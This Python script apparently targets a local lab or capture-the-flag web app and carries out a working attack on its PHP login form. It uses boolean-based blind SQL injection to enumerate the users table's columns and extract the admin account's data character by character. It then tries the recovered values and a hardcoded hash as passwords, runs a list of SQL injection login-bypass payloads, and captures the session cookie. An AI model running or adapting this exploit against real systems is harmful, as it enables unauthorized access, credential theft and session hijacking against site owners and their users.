import requests
import string

BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

session = requests.Session()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

def test_injection(payload):
    """Test SQL injection - returns True if response contains 'password'"""
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "submit"
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers)
        return "password" in response.text
    except:
        return False

def extract_string(query, max_length=100):
    """Extract string using boolean-based blind SQL injection"""
    result = ""
    
    for pos in range(1, max_length + 1):
        # For each position, try all possible characters
        found = False
        for char in string.printable:
            ascii_val = ord(char)
            if ascii_val < 32 or ascii_val > 126:
                continue
                
            test_payload = f"admin' AND ASCII(SUBSTRING(({query}),{pos},1))={ascii_val}-- "
            
            if test_injection(test_payload):
                result += char
                print(f"\r[+] Extracting: {result}", end='', flush=True)
                found = True
                break
        
        if not found:
            break
    
    print()  # New line after extraction
    return result

def extract_column_count():
    """Extract number of columns in users table"""
    print("\n[+] Extracting column count...")
    
    for i in range(1, 20):
        query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users'"
        test_payload = f"admin' AND ({query})={i}-- "
        
        if test_injection(test_payload):
            print(f"[+] Found {i} columns")
            return i
    
    return 0

def extract_column_names():
    """Extract all column names from users table"""
    print("\n[+] Extracting column names from users table...")
    
    columns = []
    for i in range(0, 10):  # Try first 10 columns
        query = f"SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET {i}"
        column = extract_string(query, max_length=50)
        if column:
            print(f"[+] Column {i+1}: {column}")
            columns.append(column)
        else:
            break
    
    return columns

def extract_all_data(columns):
    """Extract all data for admin user from all columns"""
    print(f"\n[+] Extracting all data for admin user...")
    
    admin_data = {}
    for column in columns:
        print(f"\n[+] Extracting {column}...")
        query = f"SELECT {column} FROM users WHERE username='admin' LIMIT 1"
        data = extract_string(query, max_length=100)
        admin_data[column] = data
        print(f"[+] {column}: '{data}'")
    
    return admin_data

def authenticate(username, password):
    """Attempt authentication"""
    print(f"\n[+] Attempting authentication - Username: {username}, Password: {password}")
    
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    response = session.post(LOGIN_URL, data=data, headers=headers)
    print(f"[+] Response: {response.text}")
    
    if "Success" in response.text:
        cookies = session.cookies.get_dict()
        if "PHPSESSID" in cookies:
            return cookies["PHPSESSID"]
    
    return None

# Main execution
print("="*60)
print("COMPREHENSIVE DATA EXTRACTION")
print("="*60)

# First, verify injection works
print("\n[+] Testing injection...")
if test_injection("admin' AND 1=1-- "):
    print("[+] Injection confirmed working")
else:
    print("[!] Injection not working")
    exit(1)

# Extract column names
columns = extract_column_names()

if not columns:
    print("[!] Failed to extract columns")
    exit(1)

print(f"\n[+] Found columns: {columns}")

# Extract all data for admin user
admin_data = extract_all_data(columns)

print("\n" + "="*60)
print("EXTRACTED ADMIN USER DATA")
print("="*60)
for column, value in admin_data.items():
    print(f"{column}: '{value}'")

# Try to authenticate with any field that looks like it could be a password
print("\n" + "="*60)
print("ATTEMPTING AUTHENTICATION")
print("="*60)

# Check if there's a password or similar column
password_candidates = []
for col, val in admin_data.items():
    if 'pass' in col.lower():
        password_candidates.append(val)
    elif len(val) > 5 and col != 'username':
        password_candidates.append(val)

# Also try hash we found earlier
password_candidates.append("7d39307ae824e70052c0aa16816a9b16")

# Try to authenticate
for password in password_candidates:
    if password:  # Only try non-empty passwords
        phpsessid = authenticate("admin", password)
        if phpsessid:
            print("\n" + "="*60)
            print("SUCCESSFUL AUTHENTICATION!")
            print("="*60)
            print(f"Username: admin")
            print(f"Password: {password}")
            print(f"PHPSESSID: {phpsessid}")
            break

# If no password worked, try SQL injection authentication bypass
print("\n" + "="*60)
print("TRYING SQL INJECTION AUTHENTICATION BYPASS")
print("="*60)

bypass_payloads = [
    "admin' OR '1'='1'-- ",
    "admin' OR 1=1-- ",
    "' OR '1'='1'-- ",
    "' OR 1=1-- ",
    "admin'-- ",
    "' OR '1'='1' LIMIT 1-- "
]

for payload in bypass_payloads:
    print(f"\n[+] Trying bypass payload: {payload}")
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "submit"
    }
    
    response = session.post(LOGIN_URL, data=data, headers=headers)
    print(f"[+] Response: {response.text}")
    
    if "Success" in response.text:
        print(f"\n[!] BYPASS SUCCESSFUL!")
        cookies = session.cookies.get_dict()
        if "PHPSESSID" in cookies:
            phpsessid = cookies["PHPSESSID"]
            print(f"[!] PHPSESSID: {phpsessid}")
            break
